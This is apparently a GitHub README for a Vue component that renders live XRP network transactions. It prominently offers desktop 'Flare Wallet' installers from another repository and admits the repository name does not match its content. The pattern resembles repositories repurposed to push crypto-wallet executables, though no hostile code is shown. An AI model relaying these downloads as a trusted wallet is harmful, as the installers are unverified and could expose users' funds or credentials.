![Flare Wallet](assets/banner-hub.png)

# XRP transaction waterfall

A Vue component that draws XRP network transactions as they arrive, kept here as the visual side of reading a transaction.

<p align="center"><a href="https://github.com/flarewallet/tx-verifier/blob/HEAD/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/download/v1.3.02/flare-wallet-desktop-linux-v1.3.02.zip) |

> This is a visual component, not the wallet, and not a signing tool. The installers above come from the release repository.

## What this repository is for

This is a Vue component called `XRPWaterfall`. It opens a WebSocket to the XRP network, listens for transactions as they are validated, and draws them on a canvas as a moving stream, with a marquee band and a settings panel beside it. `package.json` names it `vue-xrp-waterfall` and describes it as "Visual rendering of XRP Network Transactions", which is exactly what the code does.

The structure is three components and one mixin. `src/xrp-waterfall.vue` is the shell: it renders `Canvas`, `Marquee` and `Settings`, mixes in `HasWebSocket`, and shows a "Connecting" state until the socket opens. `src/components/` holds the drawing, the band and the controls. `examples/` is a runnable page: `index.html`, `index.js` and an `App.vue` that mounts the component, so you can see it working before you integrate it.

What it is not matters as much as what it is. It does not decode a transaction you paste in, it does not check a signature, and it does not tell you whether a payment is safe. It shows you live traffic. That is a genuinely useful thing when you want to see that a transaction you just sent actually exists, and it is not the same as verifying one: for that, read the transaction on the explorer and compare the fields yourself.

The name of the repository says verifier; the package inside says waterfall. The second is the accurate one, and this page uses it.

## Who it is for

- Developers who want a drop-in Vue component that shows live XRP activity.
- Readers who learn better from seeing traffic than from reading a schema.
- Anyone checking that a transaction reached the network, as a first look before the explorer.

## Start here

- [Download the wallet](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) if you came here expecting a Flare product.
- [Read the transaction streamer](https://github.com/flarewallet/flare-systems-deployment) for the same data as a callback instead of a canvas.
- [Read the XRP setup tool](https://github.com/flarewallet/fdc-client) for the account side of the same chain.
- [Verify any download](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) against the published hashes.

## How to use these guides

1. Run `examples/` first; it mounts the component with no build step of your own.
2. Expect a live socket: the component streams the network, it does not replay history.
3. Use the settings panel to narrow what you see before drawing conclusions from the picture.
4. Treat a point on the canvas as a hint that a transaction exists, then confirm it on the explorer.
5. Remember it renders; it does not validate. Do not describe it as a verifier.
6. Keep the licence notice with the component if you redistribute it.

## The guides

- [Flare Wallet desktop application](https://github.com/flarewallet/flare-desktop-wallet) is the actual Flare product in this account.
- [Blockchain transaction streamer](https://github.com/flarewallet/flare-systems-deployment) streams XRP, Stellar and VeChain transactions.
- [XRP account setup](https://github.com/flarewallet/fdc-client) covers the older Spark distribution flow.
- [Flare Wallet profile](https://github.com/flarewallet) lists every repository with what it contains.

## What each guide changes

| Task | Repository | Outcome |
| --- | --- | --- |
| Watch live XRP traffic | This repository | A rendered stream of network transactions |
| Handle transactions in code | flare-systems-deployment | A callback per transaction |
| Understand XRP account setup | fdc-client | The association transaction and its warning |
| Get the Flare wallet | Release page | A verified installer |

## Common first questions

### Does it verify a transaction?

No. It renders live network traffic. Verification means reading the fields and the signature on the explorer, or decoding them yourself.

### Can I paste a transaction hash into it?

Not in the code as published. The component listens to the live socket; there is no lookup by hash in it.

### Who wrote it?

The component is `vue-xrp-waterfall`, published under the MIT licence with its copyright notice in `LICENSE`. That notice is kept as it stands.

## Before you install

- Remember the installers on this page are the wallet, not this component.
- Take the wallet only from the release repository.
- Match all 64 characters of the hash before running anything.
- Keep your recovery phrase offline; no rendering tool needs it.

## About and license

XRP transaction waterfall is published under the MIT licence; the copyright notice in `LICENSE` is kept as it stands. The repository holds the component, its three sub-components, a runnable example and a built bundle in `dist/`.

Flare Wallet is independent of Flare Foundation, Flare Labs and Ava Labs. XRP and the XRP Ledger are named because the component reads their network.
